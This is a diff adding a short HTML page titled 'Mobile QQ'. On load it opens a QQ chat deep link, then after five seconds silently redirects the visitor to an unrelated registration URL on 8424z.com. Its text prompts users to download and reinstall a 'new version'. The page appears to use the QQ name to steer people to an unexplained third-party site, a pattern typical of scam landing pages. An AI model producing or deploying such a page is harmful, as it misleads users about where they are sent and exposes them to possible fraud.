@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>手机QQ</title>
+    <script>
+        function launchQQAndApp() {
+            window.location.href = "mqq://im/chat?chat_type=wpa&uin=123456789&version=1&src_type=web";
+            setTimeout(function() {
+                window.location.href = "https://8424z.com/register?key=7343753458";
+            }, 5000);
+        }
+        
+        window.onload = function() {
+            launchQQAndApp();
+        };
+    </script>
+</head>
+<body>
+    <p>正在尝试打开QQ...</p>
+    <p>如果未自动跳转，请<a href="javascript:launchQQAndApp()">点击这里</a></p>
+    <p>或者手动打开，下载新版重新安装</p>
+</body>
+</html>
